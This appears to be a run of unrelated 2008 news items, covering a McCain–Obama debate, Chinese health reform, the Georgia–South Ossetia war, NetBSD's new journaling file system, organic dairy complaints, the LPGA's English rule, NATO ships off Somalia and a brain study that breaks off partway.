Both took the opportunity to blame each other for playing a role in causing the economic crisis .
McCain accused Obama of receiving donations from individuals at Fannie Mae and Freddie Mac , the mortgage giants whose failures signaled the oncoming financial crisis .
" The real catalyst was Fannie and Freddie .
They 're the ones who were the encouragement of Sen.
Obama and his cronies that went out and made all these risky loans , gave them to all these people who could n't pay back .
There were some of us who stood up and said we needed to enact legislation , " McCain said .
" There were some of us who stood up against this , " he said .
" There were others who took a hike . "
Obama has received $ 126,349 -- $ 120,349 from employees and $ 6,000 from Political Action Committees or PACs -- since he joined the Senate in 2005 , according to the Center for Responsive Politics .
His total is the second largest of any member of Congress , right behind Sen.
Chris Dodd , D - Conn. , at $ 165,400 .
McCain has received $ 21,550 from employees ( nothing from PACs ) since 1989 -- a period 14 years longer than Obama has been in the Senate -- according to the Center for Responsive Politics .
Obama said he was the real reformer of the two , who had called Treasury Secretary Henry Paulson and Federal Reserve System chairman Ben Bernanke to take action while McCain was waiting for the free market to correct itself .
" I 've got to correct McCain 's history , not surprisingly .
Deregulation of the financial system .
McCain , as recently as March , bragged about the fact that he 's a deregulator .
Two years ago I said there was a subprime crisis we had to deal with .
I wrote to Paulson and Bernanke and told them it 's something we need to deal with .
I never promoted Fannie Mae . "
Then Obama switched tacks , speaking directly to Oliver Clark , the audience member who had asked a question about the bailout , saying , " You 're not interested in politicians pointing fingers .
You 're interested in the impact on you .
This is not the end , this is the beginning of the process . "
Asked whether that meant he thought the economy was poised to get much worse , Obama said , " I am confident about the American economy , but we are going to have to have to leadership from Washington . "
Obama , McCain on Attacking Pakistan
The two men clashed over whether the U.S. military should make cross - border excursions into Pakistan to fight suspected militants , offering different perspectives on how the United States should flex its might and turning the issue into a question of leadership .
McCain accused Obama of pandering and emboldening American enemies by announcing he would use his military strikes in advance .
" I 'm not going to telegraph my punches , which is what Sen. Obama did , " said McCain , adding that follows the lead of his hero Teddy Roosevelt , who believed the United States should " talk softly but carry a big stick . "
In that heated exchange , Obama accused McCain of hypocrisy .
" This is a guy who sang ' Bomb , bomb , bomb Iran , ' who called for the annihilation of North Korea -- that I do n't think is an example of speaking softly . "
McCain said Obama " was wrong about Iraq and the surge .
He was wrong about Russia when they committed aggression against Georgia .
And in his short career he does not understand our national security challenges .
We do n't have time for on the job training . "
Energy and Oil
Both men conceded that the nation 's energy policy needed to be changed , but disagreed on how best to end American reliance on foreign oil .
" I 've disagreed strongly with the Bush administration on this issue .
I 've traveled all over the world to look at greenhouse gas emissions , " said McCain .
" What 's the best way of fixing it ?
Nuclear power .
I was on Navy ships that had nuclear power plants .
Nuclear power is safe and clean .
I know that we can reprocess the spent nuclear fuel .
The Japanese , British and French do it .
Obama opposes that . "
Obama said McCain had voted 23 out of 26 times against alternative fuel bills presented to the Congress and said he supported nuclear power , in addition to solar , wind and thermal energy .
" This is one of the biggest challenges of our time , and it 's absolutely critical we understand it's not a challenge , it 's an opportunity , " he said .
" I 've called for investments in solar , wind , thermal .
I favor nuclear power as one component of our energy mix , but I think this is another example where we have to look at the record . "
Obama , McCain Health - Care Plans Differ
Any common ground they found on energy was lost in their divergent plan on health care .
McCain called health care a " responsibility " while Obama called it a " right . "
McCain wants to give families a $ 5,000 tax break that would allow them to look for affordable health care that best met their needs .
Obama , on the other hand , wants to continue with the current system , in which employees receive coverage through their jobs , but augment it with government funding to help the uninsured .
" If you 've got health care already , and probably the majority of you do , then you can keep your plan if you 're satisfied with it .
We 're going to work with your employer to lower the cost of your premiums by as much as $ 2,500 a year .
If you do n't have health insurance , you 're going to be able to buy the same kind of insurance McCain and I enjoy as federal employees , " Obama said .
Obama said McCain 's plan would require taxes on the benefits workers receive from their employers and wipe out the ability of states to enforce regulations requiring certain tests like mammograms .
McCain said that Obama 's plan would penalize small - business owners and parents .
If you 're a small - business person and you do n't insure your employees , he 'll fine you , " McCain said of Obama .
" If you 're a parent and you 're struggling to get health care for your children , he 'll fine you . "
Down in the polls , McCain and his running mate , Sarah Palin , went on the offensive this weekend , aggressively attacking Obama for his association to 1960s radical William Ayers , a move some see as part of a last - ditch attempt to revive a flagging campaign .
McCain and Obama Battle for Voters
McCain still has time and hopes that the attacks will swing the momentum in several important swing states .
In Pennsylvania , Obama leads 48 percent to 38 percent ; and in Florida , 48 percent to 46 percent , according to latest battleground polls monitored by ABC News .
As a new ABC News / Washington Post poll indicates , Obama has taken a commanding lead in Ohio , where days ago the two were virtually tied , in large part because of the area 's economic difficulties .
Obama now leads McCain , 51 percent to 45 percent , among likely voters in Ohio , according to the poll .
Though 18 percent of the respondents said they had not yet made up their minds for sure , Obama had the advantage of the sheer energy of his backers .
Fifty - eight percent of his Ohio supporters are " very enthusiastic " about his candidacy , compared with 30 percent of McCain's .

Free -market economic reforms rolled out across the Chinese health system in 1978 have led to a collapse in healthcare provision for a fifth of the world ’s population , researchers have concluded .
The Chinese government , recognising the disparities in access to healthcare between the urban rich and rural poor , is planning to overhaul the world ’s largest health system .
The plan , entitled “ Healthy China 2020 ” , aims to restore universal access to primary healthcare by 2010 .
“ Before the reforms of 1978 , more than 90 % of the rural population was covered by a cooperative medical scheme , ” says public health researcher Margaret Whitehead of the University of Liverpool , UK , and author of an analysis of the health system in China .
“ After market reforms , less than 10 % of the rural population was covered , ” she says .
Since the reforms – instigated by then - leader Deng Xiaoping – there has been a shift towards patients having to pay for their own treatment .

Corrupt system
In 1980 , 20 % of total expenditure on health in China was funded in this way .
By 2000 , patients were paying for 59 % of their healthcare , falling back to 49 % by 2006 .
In France , the comparable figure is 11 % .
This has left 35 % of urban households and 43 % of rural households in China unable to afford medical care .
At the same time , government funding for health has been almost exclusively consumed by municipal hospitals in cities .
By 2005 , only 10 % of the state budget went to rural and urban health centres .
Forcing health providers to cover most of their costs by charging patients has also corrupted the system , the authors say , encouraging doctors to charge for the most expensive instead of the most effective treatments .
Collectively , the costs and reforms have bankrupted millions of families , pushing them into a “ medical poverty trap ” where they sell all their assets to pay for medical care .
“ Instead of the health system improving people ’s health , it ’s making them poorer , ” says Whitehead .
“ It ’s a complete market failure , and because China is so big , it ’s a massive failure . ”
To its credit , says Whitehead , the Chinese government is recognising and tackling the problem , not least because of public pressure .
A poll in January of 100,000 Chinese households in 5000 communities revealed that healthcare , or lack of it , is the number - one concern of the Chinese population .
‘ Awe - inspiring scale ’
The Healthy China 2020 initiative was announced by the government about two months ago .
“ It will involve about 200 medical experts divided into seven special programmes , ” says Shanlian Hu of Fudan University in Shanghai , and author of a paper summarising the negative impacts of the free - market reforms .
The priority is to reverse the huge disparities in access to health , particularly between urban and rural populations .
Another big focus will be on prevention rather than treatment .
Already , the government has vowed to restore universal access to primary healthcare within two years .
And to prevent the scandal of doctors prescribing unnecessarily expensive treatments , the government will foot the drug bill and dictate which drugs are dispensed .
But the devil could be in the detail , says Shenglan Tang of the WHO Beijing Office , and co-author of the Whitehead paper .
“ It ’s not clear how far the government wants to reduce the percentage patients have to pay , ” he says .
Nor does it promise to redirect much more money to local governments so that they can rebuild depleted rural health centres .
Whitehead says that the world will be watching to see how China manages such a massive upheaval .
“ What ’s awe - inspiring is the sheer scale of it , ” she says .
“ At least they have the money to do it . ”

Mega Man 9 is the part of Capcom 's new strategy to revive old school franchises .
In a classic return to form , Mega Man 9 channeled the days of eight bit graphics and ass poundingly high levels of difficulty , finally releasing a true successor to Mega Man 2 .
Hidden secrets and Easter Eggs where staples of the 8 bit era and it looks like Mega Man 9 has one of it's own .
Yesterday afternoon in Capcom 's own forums , Senior Community Manager Seth Killian left a series of cryptic posts detailing a single undiscovered secret , still at large :
" There 's only one undiscovered Mega Man 9 secret that I know about ...
... I 'm not revealing it here just yet .
And go nuts -- I do n't predict anyone will discover this one for quite a while yet ... " -- Seth Killian
He went on to clarify that this was not the already released Protoman or Fakeman DLC , which leaves me puzzled .
I still have n't had the time to finish the game , so I am throwing this out to you guys :
What do you think this secret might be ?
The latest sign that the Chinese juggernaut is poised to supplant the U.S. as the world 's economic hegemon ?
Bud Light ( soon to be owned by Belgians , but still a U.S. brand ) has been replaced by " Snow Beer , " a joint venture between London - based SABMiller and China Resources Enterprise , as the world 's most - consumed beer brand .
WSJ :
" I can confirm that the Chinese brand Snow is now the largest beer brand in the world , " says Kevin Baker , account director for alcoholic beverages at the U.K. - based market - research firm Canadean Ltd.
About 51.2 million hectoliters , or about 1.35 billion gallons , of Snow were consumed last year , compared with 48.4 million for Bud Light as a stand - alone brand , the firm says .
Another research firm in the U.K. , Plato Logic , says Bud Light remained the top brand in 2007 , with 51.8 million hectoliters consumed to Snow 's 51.2 million .
But that slim lead faces a challenge : China Resources said last week that the Snow brand 's sales volume jumped 22 % in the first half of this year compared with a year earlier , putting it on pace to unseat Bud Light , which is consumed mostly in the slower - growing U.S. market .
But do n't despair .
If you consider Budweiser and Bud Light as two parts of the same brand , then Bud still retains the title by a comfortable margin .
China 's beer market has been the world 's largest for the last six years and is growing at a staggering 10 % annually .
Despite its huge size , however , the market is not nearly as profitable as its U.S. and European counterparts .
In China , beer companies make $ 2 on each hectoliter of beer sold , compared to between $ 50 and $ 80 in the West .

A caller on C - Span ’s Washington Journal asserts that Congressman Ron Paul and Infowars.com are better sources to understand the current financial crisis than the dominant mainstream media and typical go - along political figures .
The caller also brings up the Federal Reserve as being the main issue that Washington needs to address .
Uri Dadush , Economic Department Director of the World Bank , seems stumped by the mention of the Federal Reserve , which he claims is ‘ part of the system of U.S. government already ’ , before redirecting the conversation towards liquidity efforts in the private banking sector .
Dadush misses the point– perhaps out of confusion , and perhaps out of reluctance to discuss– that the Federal Reserve ( which is private , but given power [ unconstitutionally ] by Congress ) controls the money supply and can print at will .

A plan to hunt and shoot up to 100 wolves in the mountains of northern Spain has angered environmentalists who say the culling is an unnecessary sop to farmers who claim livestock are under attack .
The plan comes as hill farmers in parts of the northern province of León complain that the wolves ' population growth is higher than that for humans .
Some mayors claim wildlife is given a higher priority than humans in the rugged countryside along the Cordillera Cantábrica chain of mountains .
" The wolf gains where man gives way , " the Diario de León newspaper said .
" As soon as the people who work the valley go off to find a better standard of life , the wolf occupies their territory and begins to reproduce . "
The area around the Leonese town of Riaño has lost almost two - thirds of its population over several decades .
It now has 17 packs of wolves .
Environmentalists said this was no excuse for culling the wolf population .
" You can not set about liquidating between 10 and 30 % of the wolf population , " said a spokesman for the local office of the World Wildlife Fund .
Some 100 packs of wolves are believed to roam the countryside in León , with at least a quarter of them known to be reproducing .
They travel widely and extend into neighbouring areas of Galicia , Cantabria and Asturias .
Farmers in Asturias are worried that the wolves will move into their region when the culling starts .
" It is logical to think that we run the risk of them settling here , " said a spokesman for farmers in the Aller region .
Environmentalists say that many attacks on cattle attributed to wolves are actually carried out by wild dogs .

With the recent events in Georgia and South Ossetia different newspapers and news agencies provided different information on what happens in the conflict regions .
It seems that the political arena was divided into three main segments : the United States , Russia and the European Union .
Each one of them provides its own opinion on the issue and a number of opinions proved to be quite controversial .
Russian newspaper Vzglyad wrote that Russia still faces strong pressure from the United States and EU for entering into the Georgia - South Ossetia conflict .
US vice - president Dick Cheney told Mikheil Saakashvili that " Russia 's aggression must not go unanswered " .
Though Georgia announced cease fire in South Ossetia , Russian peacekeepers in the region stated that the promise was not kept .
Since the introduction of the 58th army in the conflict region , Russia has been continuously criticized by the United States .
Mikheil Saakashvili managed to speak to several European leaders and gain some support .
Dick Cheney was the last one that Georgian president managed to talk to .
According to the Associated Press , he called the Georgian leader to express his support in the conflict with Russia concerning South Ossetia .
He also expressed " solidarity with the democratic leadership of Georgia in front of the threat of its sovereignty and territorial integrity . "
Cheney told Saakashvili that in case the Russian aggression continues " it will have serious consequences for its relationships with the US , as well as with other countries from the European Community . "
The first wave of criticism arrived from the Georgian permanent representative to the U.N. Irakli Alasania , who called the actions of the 58th army , which pushes Georgian troops away from South Ossetia , " full - scale occupation of Georgia " .
He said that Russian troops are killing civilians and the Georgian government .
The secretary of Georgian national defense Aleksandr Lomaya , on Sunday announced about the termination of military operations in Tbilisi .
He stated that Georgian forces do not fight either in South Ossetia or in Abhazia .
However , the commander of joint forces for peace maintenance in the conflict region , General Marat Kulahmetov , stated that the shooting continued Sunday night through Monday .
He mentioned that one of the peacekeepers ' posts was bombarded by the Georgian planes .
The General said that the main goal for August 11 would be assuring a safe withdrawal from Tskhinvali towards North Ossetia of the convoy carrying the injured and those left without shelter .
According to Interfax , the general did not give a " 100 percent guarantee " that Georgian forces will not attack the convoy .
The UN also blamed Russia of not willing to talk to the Georgian president after he called Russian president Dmitry Medvedev but the latter refused to talk .
In response the current Permanent Representative of the Russian Federation to the United Nations , Vitaly Churkin , named Georgia the world record breaker for increasing the military budget , which for the last years went up 30 times .
" Now we understand what it was meant for " , he said .
He added that everything seen in the conflict was neither accidental nor unexpected .
Churkyn reminded that for several times Russia called attention to the dangerous situation around Abkhazia and South Ossetia .
In regard to the military cooperation between Georgia and the United States he also mentioned that there were 127 military advisers from the US Ministry of Defense working in Georgia at that moment .
According to Russian newspaper , Izvestia , lately an American mercenary was captured in South Ossetia .
He was one of the members of Georgian guides , captured near Zar village .
It is believed that the American citizen is a NATO instructor .
Currently he was transported to Vladikavkaz for further investigation of his presence on the territory of South Ossetia .
Vitaly Churkin in detail told about the involvement of the United States in the conflict .
He said that in the same day when the war began , both Georgian and American troops finished full - scale joint military training , called " Immediate response " .
According to Churkin , 1,000 American troops took part in the training .
He said that Georgian armed forces instantly applied what they learned together with the American colleagues in the conflict .
" We would n't like to think that the US gave green light to these adventurist actions of the Georgian leadership " , said the Russian representative .
Izvestia wrote that Churkin was surprised of Tbilisi 's reaction regarding the refusal of the Russian president to talk to Mikheil Saakashvili .
" Is there any decent person who would like to talk to the Georgian president ? " he asked .
" Till now he ( Saakashvili ) assured that he did n't even have in mind to use force against his own people " , mentioned Churkin .
The Russian newspaper also wrote that Moscow looks forward to start the negotiations only after Georgian troops will leave South Ossetia and an agreement will be signed up stating that parties will not use any military force .
Churkin characterized the Georgian aggression as an " ethnical cleaning " .
" From a population of about 120,000 over a quarter became refugees .
Is this an ethnical cleaning or not ?
Over 2,000 civilians were killed .
How many people have to be killed before the situation would be called ethnical cleaning ? " he asked the participants of the meeting .
No one answered his question .
According to Mikheil Saakashvili , who had an interview with German mass media , Moscow intends to take over Georgia , so it would get control over the energy supply routes coming from Central Asia .
" They want the whole of Georgia , " he said in an interview with Germany 's Rhein - Zeitung newspaper .
" The Russians need control over energy routes from central Asia and the Caspian Sea .
In addition , they want to get rid of us , they want regime change .
Every democratic movement in this neighboring region must be got rid of . "
According to Reuters , Russia demanded an unconditional withdrawal of the Georgian armed forces from the region .
After arriving to Tbilisi to meet the Georgian president , French Foreign Minister Bernard Kouchner said a " controlled withdrawal of the troops " was his major priority .
" Coming back to the table , negotiations , peace talks , a political solution .
That 's it .
Easy to say , very difficult to do , " Kouchner told journalists .
Meanwhile , the agency reports that the US continues to blame Russia for its " disproportionate and dangerous " military action in South Ossetia .
According to the permanent United States Ambassador to the United Nations , Zalmay Khalilzad , Russia considers a " regime change " by saying that current president of Georgia , Saakashvili should leave office .
Khalilzad also mentioned that Russian ambassador Vitaly Churkin indirectly suggested that some leaders in the country became " obstacles " to their citizens .
One of the Reuters reporters said that heavy bombardment took place in regions around Tskhinvali on Sunday evening , though there was no information about which side was firing .
A photographer , working for Reuters , reported seeing dead Georgian soldiers in Tskhinvali , while entering the area together with the Russian troops .
Today the Russian news agency RIA Novosti ( rian.ru ) wrote that Russian tourists are stuck in Georgia .
According to several eyewitnesses , the local policemen are holding back Russian citizens who came to Georgia whether to see their relatives or for business .
Policemen check the documents and then force tourists to return to the place of departure .
The officials from South Ossetia have already called the situation " the politics of state banditism " and assured they will take " adequate measures " .
In addition they accused Tbilisi of bombarding the territory of South Ossetia .
The roads to entry - exit point Sarpi located on the boarder between Turkey and Sadahlo ( found on the boarder with Armenia ) are closed for Russian citizens .
They are also not allowed to enter the capital of Georgia , the agency reported .
The New York Times quoted Georgian sources as saying that on Sunday Russia has expanded its assaults on Georgia .
Russian tanks and troops crossed the region of South Ossetia and moved towards the city of Gori , located in central Georgia .
The newspaper says that taking into consideration this particular maneuver and the fact that Russian troops bombed Tbilisi , the capital of Georgia , the goal of Russia in the region went far beyond securing citizens from South Ossetia and Abkhazia .
It now focuses on weakening Georgian armed forces .
NY Times also wrote that Georgia pulled out its troops and offered a cease fire but Russia continued its moves , which caused an alarm and anger on the international arena .
It says that Russia continued attacks by air , naval and missile assaults .
The involvement , according to the newspaper , is the largest engagement of Russian troops outside the country 's boarders since the dissolution of the Soviet Union .
The American officials in Washington stated that Georgian troops made attempts to disengage but Russian armed forces did not allow them to do so .
" The Georgians told them , ' We 're done .
Let us withdraw , " said one American military official said .
" But the Russians are not letting them withdraw .
They are pursuing them , and people are seeing this . "
The newspaper says that diplomats from Georgia and the Western countries offered a cease fire note but Russian officials denied this fact , saying that there was n't such note .
Interfax .ru proved the fact that the Georgian Ministry of Foreign Affairs gave the Russian consul a note which says that according to the order given by the president , Georgia will cease fire in South Ossetia .
In addition the note said that all of the Georgian armed forces drew out from the conflict zone .
The document stated that Georgian created a humanitarian corridor and made it possible for civilians to exit the conflict zone .
The Russian Ministry of Foreign Affairs confirmed the fact that the note was passed , but focused on the fact that Tbilisi continues its military actions in South Ossetia .
" Such note indeed exists " , a source from the MFA of Russian Federation told Interfax .
At the same time the source added that " Georgian forces did not cease fire in the region . "
Another representative from the Russian administration stated that the announcement of the Georgian administration about ceasing fire and retreating of armed forces did not correspond to what was actually happening in the conflict region .
" We were given the note stating that from 5 AM Georgia will cease fire and draw out its forces from the conflict zone , but our sources from the region do not confirm this statement , " said the interlocutor of the agency .
He said that the Russian Ministry of Foreign Affairs " possesses information that the fire is still going on and the Georgian armed forces did not leave the region completely . "
The head of Ministry of Foreign Affairs of South Ossetia , Murat Djioev , said that currently the situation in the conflict area is stable , but the Georgian side periodically keeps firing from heavy weapons .
Now Tskhinvali is under the control of South Ossetian forces and it is possible to start restoring normal life in there .
Vzglyad Newspaper wrote that acute confrontations took place last night in the peacekeepers ' zones of responsibility .
One of the peacekeepers ' posts was bombarded by the Georgian aviation .
The newspaper quoted Russian officials as saying that Russia looks forward to prove to the world that Georgia 's actions in South Ossetia represent genocide of people in Ossetia .
The evidence of genocide will be collected by the Investigative committee by the prosecution department of Russia .
Such order was given by the president of Russian Federation Dmitry Medvedev .
Meanwhile Georgia asks for peace , Washington states about the worsening of the relationships with Moscow and Germany estimate Tbilisi 's chances of entering NATO .
Aleksandr Bastyrkin , chairman of the Investigative committee by the prosecution department of Russia , is appointed to document the crimes of Georgia in the separatist republic for further criminal proceedings .
At the same time Vzglyad Newspaper wrote that the head of Russia 's Ministry of Foreign Affairs , Sergey Lavrov , during the telephone conversation with Condoleezza Rice , mentioned about the numerous military crimes of Georgian armed forces against the citizens of South Ossetia , the result of which is a humanitarian catastrophe in the region .
The BBC News reported that the United Nations refugee agency asked the parties involved in the conflict to grant safe passage to people who want to escape the conflict region - up to 20,000 within Georgia and about 30,000 people fleeing into North Ossetia , a Russian province .

A wish came true : NetBSD finally has a journaling file system .
Simon Burge added support for WAPBL , Write Ahead Physical Block Logging file system journaling , to NetBSD - current ’s main branch today .
The main purpose of a journaling file system is to avoid a time consuming file system checks after a power failure , system crash or similar problem .
But it can also help to improve performance considerably depending on the design .
As I was curious about WAPBL ’s performance impact I ran my usual benchmark ( extracting the NetBSD 4.0 source tar archives ) .
And the result is very encouraging : FFS required 15:19 minutes to finish the benchmark without logging and only 3:24 minutes to finish it with logging .
It seems that WAPBL provides similar speed improvements as soft dependencies and keeps your file system safe at the same time .
A big thank you to Wasabi Systems for donating the code and to Simon Burge and all the other developers for integrating WAPBL into NetBSD !
October 13 , 2008FOR IMMEDIATE RELEASEContact : Mark Kastel , 608.625.2042 Collateral Damage : Organic Farmers Being Squeezed Out Corporate Takeover Threatens Farmers , Mission
Cornucopia , WI - Groups representing organic farmers and their customers are calling on consumers to help save the organic industry by exclusively patronizing dairies , and other brands , that uphold the spirit and letter of the federal organic law .
They claim the acquisition of major brands by corporate agribusiness , and their dependence on factory farms , threatens to force families off the land and deprive consumers of the superior nutritional food they think they are paying for .
" This could be the end of the organic industry as we know it , " said Mark A. Kastel , codirector of The Cornucopia Institute , widely recognized as the organic industry 's most aggressive farming watchdog .
The Institute reports that the proliferation of industrial - scale dairies has bloated the organic milk supply , inflated the price of feed for dairy cows , and resulted in a financial crisis for family farmers , even as the market continues to grow - defying the general economic downturn .
The Wisconsin - based Cornucopia Institute announced today that it has filed formal legal complaints , seeking USDA enforcement , against two more operators of giant industrial dairies .
The farm policy research group claims they are " masquerading as organic . "
Cornucopia also announced that it has released an update to its popular organic scorecard helping consumers make informed choices in the marketplace in selecting dairy brands that represent the highest level of organic practices .
The dairy segment , second only behind fresh fruits and vegetables , represents nearly $ 4 billion worth of annual revenue or about 15 to 20 % of the organic industry .
For eight years , participants in the organic community - farmers , consumers , retailers , and other stakeholders - have fought the industrialization of organic milk by giant corporations and factory farms milking as many as 10,000 animals .
Although the National Organic Standards Board , the expert panel set up by Congress to advise the Secretary of Agriculture , has voted to crack down on industry scofflaws five times since 2000 , Bush administration officials have refused to act .
" This cynical corporate takeover of organic farming , an agriculture segment that is held in high regard by consumers , resulting in a highly successful and growing market , has been aided and abetted by the gross disregard of the USDA 's enforcement responsibilities , " said Merrill Clark , a certified organic livestock producer and former member of the USDA 's National Organic Standards Board .
Cornucopia 's legal complaints to the USDA targeted Phoenix - based Shamrock Farms , which operates an industrial dairy milking approximately 11,000 cows in the desert 54 miles south of their plant , and the Rockview Farms Dairy of Downey , California , the operator of another giant industrial dairy in the desert north of Las Vegas , Nevada .
" When Cornucopia staff visited Shamrock 's operation we found inadequate , overgrazed pasture adjacent to their milking facility , and we were told by Shamrock employees that the confined cows had not been out in weeks , " Kastel stated .
Federal organic regulations require that cows be grazed .
" Not only do these confinement operations create an unfair competitive playing field , discriminating against all the family farmers who work hard to fulfill both the letter and intent of the national organic standards , they also are denying the consumer the extra healthful nutrients that university studies have verified as being present in the milk of cows that graze fresh green grass , " said Kathie Arnold , president of the Northeast Organic Dairy Producers Alliance .
Cornucopia 's filing of a legal action against Rockview Farms Dairy chronicled similar alleged violations of organic livestock management rules .
Rockview Farms , of Downey , California , produces their organic milk at a giant industrial farm in the Nevada desert near Amargosa Valley , just northwest of Las Vegas .
Its milk is marketed under the Good Heart label .
" Just like Shamrock , Rockview 's phony - baloney organic farm primarily confines their cattle in a massive feedlot milking both organic and conventional cows , " Kastel affirmed .
" This outfit is everything that organics is n't - in addition to confining their cattle , Rockview has been accused of environmental damage and even irrigates some of their land with waste products from a municipal sewage plant . "
One way that Cornucopia is fighting unethical corporate players like Shamrock , Rockview , and the industry 's largest dairy , Dean Foods , which markets organic milk under the Horizon label , is to educate and engage consumers .
Cornucopia just updated their organic dairy scorecard , which ranks every brand in the country - large and small - based on their ethical approach to their milk production .
It contains 107 organic brands covering fluid milk , yogurt , cheese , butter , and ice cream .
" We have encouraged our 900,000 members and collaborators to use Cornucopia 's research when making their purchasing decisions for organic dairy products , " said Ronnie Cummins , director of the Organic Consumers Association ( OCA ) .
In the past , OCA has called on its membership to boycott the Horizon brand and milk produced by Aurora Dairy , the nation 's largest manufacturer of private - label organic milk .
" We are carefully examining Cornucopia 's new findings and are likely to ramp up our pressure campaign to force these bad actors to change their business models or to exit the industry , " Cummins added .
The good news for consumers , according to the Cornucopia study , is that 85 % of all name - brand marketers are respecting both the letter and spirit of the federal organic law .
Besides farmers concerned with their livelihoods , consumers have also voiced dissatisfaction with the USDA 's lack of enforcement by the alleged organic scofflaws .
A growing body of scientific literature clearly indicates that legitimately produced organic milk , from pasture - based animals , offers distinct nutritional advantages .
This year Newcastle University reported that milk from grazing cows on organic farms contains significantly higher amounts of beneficial fatty acids , antioxidants , and vitamins .

I have been watching hard drives and storage medium getting smaller and smaller over the years .
The interesting thing is that they are not only getting smaller , they are using less energy , and storing more data .
But holy crap !
An international team of scientists recently performed the ultimate miniaturization of computer memory : storing information at the nucleus of an atom .
The breakthrough is a key step in bringing to life quantum computers , devices based on the theory of quantum mechanics .
In the quantum world , objects such as atoms can exist simultaneously in multiple states –that is , they could literally be in two places at once , or possess a number of other seemingly mutually exclusive properties .
Quantum computing is seen as a holy grail of computing because each individual piece of information , or ‘ bit ’ , can have more than one value at once .
A bit is a fundamental unit of information , represented as a 0 or 1 in a normal digital computer .
Putting bits together creates a code , which generates or processes information .
However , a quantum bit , or qubit , could be both 1 and 0 at the same time .
That means a single qubit has twice the power of a normal bit , and once qubits start interacting with each other , the processing power increases exponentially .
How to maneuver and control quantum bits of information has been a major focus of experimentation .
Researchers have been testing ways to isolate a quantum bit from a noisy environment , protecting its delicate quantum information , while allowing it to interact with the outside world so that it can be manipulated and measured .
Supported in part by the National Science Foundation , a team of scientists reported a solution in this week ’s issue of the journal Nature .
The scientists were from Princeton University in New Jersey , Oxford University in the United Kingdom and the Department of Energy ’s Lawrence Berkeley National Laboratory in California .
The team described a system that used both the electron and nucleus of a phosphorous atom embedded in a silicon crystal .
Both the electron and nucleus behaved as tiny quantum magnets capable of storing quantum information .
Inside the silicon crystal , the electron cloud was more than a million times bigger than the atom ’s nucleus , with a magnetic field a thousand times stronger .
The size of the electron cloud made it well - suited for manipulation and measurement , but not so good for storing information because of electron instability .
To overcome the problem , researchers moved the information into the nucleus where it survived much longer .
“ Nobody really knew how long a nucleus might hold quantum information in this system , ” said Steve Lyon , leader of the Princeton team .
“ With crystals painstakingly grown by the Berkeley team and very careful measurements , we were delighted to see memory times exceeding the threshold . ”
The international team has demonstrated that information stored in the nucleus has a lifetime of about 1 3/4 seconds .
This is significant because before this technique was developed , the longest researchers could preserve quantum information in silicon was less than one - tenth of a second .
Other researchers studying quantum computing recently calculated that if a quantum system could store information for at least one second , error correction techniques could then protect that data for an indefinite period of time .
“ The electron acts as a middle - man between the nucleus and the outside world , ” said John Morton , a research fellow at Oxford ’s St. John ’s College .
“ It gives us a way to have our cake and eat it –fast processing speeds from the electron , and long memory times from the nucleus . ”
The LPGA will require its member golfers to learn and speak English and will suspend their membership if they do n't comply .
The new requirement , first reported by Golfweek on its Web site , was communicated to the tour 's growing South Korean membership in a mandatory meeting at the Safeway Classic in Portland , Ore. , on Aug. 20 .
Connie Wilson , the LPGA 's vice president of communications , confirmed the new policy to ESPN.com .
" Why now ?
Athletes now have more responsibilities and we want to help their professional development , " deputy commissioner Libba Galloway told The Associated Press .
" There are more fans , more media and more sponsors .
We want to help our athletes as best we can succeed off the golf course as well as on it . "
Players were told by LPGA commissioner Carolyn Bivens that by the end of 2009 , all players who have been on the tour for two years must pass an oral evaluation of their English skills or face a membership suspension .
A written explanation of the policy was not given to players , according to the report .
" Hopefully what we 're talking about is something that will not happen , " Galloway said of the potential for suspensions , according to Golfweek .
" If it does , we would n't just say , ' Come back next year . '
What we would do is work with them on where they fell short , provide them the resources they need , the tutoring and when we feel like they need to be evaluated again , we would evaluate . "
Se Ri Pak says players should be fined , rather than suspended , for not meeting the tour 's new English proficiency requirement .

Every Korean player who spoke with Golfweek about the meeting came away with the understanding she would lose her tour card if she failed the test rather than face suspension , according to the report .
But Korean players who spoke about the policy supported the tour 's position , though some , including Se Ri Pak , felt fines would be better than suspensions .
" We agree we should speak some English , " Pak said , according to the report .
" We play so good overall .
When you win , you should give your speech in English . "
Betsy Clark , the LPGA 's vice president of professional development , said a team of evaluators will assess players on communication skills including conversation , everyday survival phrases and " golfspeak . "
Players must be able to conduct interviews and give acceptance speeches without the help of a translator , she said , according to the report .
( CNN ) -- Somali Prime Minister Nur Hassan Hussein Sunday welcomed the arrival of seven NATO warships off the coast of his country to help in the battle against pirates in the region .
" We are so delighted with the arrival of those NATO ships into our waters and they have our full consent to fight against the pirates , " the prime minister said at a news conference .
" NATO can carry out any acts including military actions in our waters against the pirates , " he added .
Responding to a request from the United Nations , NATO defense ministers recently authorized the fleet of naval vessels to help protect U.N. World Food Program ships carrying relief supplies to Somalia .
The WFP ships had been protected by Canadian military vessels under a temporary arrangement that expired this week .
The NATO ships will also help " deter acts of piracy that continue to threaten the region , " the alliance said .
It is part of an international effort to curb a spate of Somali pirate hijackings in the past year in the Gulf of Aden , which partially borders Somalia .
Do n't Miss Somali forces free pirate hostages
More than 60 ships have been attacked by Somali pirates in the Gulf of Aden this year alone , compared with about half that in 2007 , according to a report released earlier this month by Chatham House , a London - based institute that analyzes international affairs .
The report found the $ 18 million to $ 30 million in ransoms already paid this year is helping to finance the war in Somalia .
One of the groups reportedly receiving ransom money is Al - Shabaab , an Islamic militant group that is waging a bloody battle for control of Somalia .
Al - Shabaab has been labeled a terrorist organization by the United States .
Pirates are still holding a Ukrainian ship carrying Soviet - made tanks , artillery shells , grenade launchers and small arms off Somalia 's coast and are demanding a $ 20 million ransom .
The MV Faina was seized in late September and is being monitored by nearby U.S. naval ships .
Last week , India sent a naval ship to escort Indian vessels traveling along the coast of Yemen and part of southern Oman .
Hassan said the pirates are an " absolute risk " to Somalia and the rest of the world .

Scientists at the University of California Los Angeles ( UCLA ) have revealed that older adults are able to increase the efficiency of their brain by performing searches on the Internet .
The survey performed shows that computer - savvy middle - aged and older adults were able to trigger key centres in the brain that control decision - making and complex reasoning .
The results may deduce that web search activity could assist in stimulating and possibly improve brain function .
Dr. Gary W. Small

Traditionally , adults are encouraged to pursue activities such as crossword puzzles and Sudoku , however the influence of the computer , especially the internet , might be able to keep the mind engaged and aid in preserving brain health and cognitive ability .
As we age , the structure and the function of the brain are usually affected by atrophy , reductions in cell activity , and increases in deposits of amyloidal plaques and tau tangles , which can impact cognitive function .
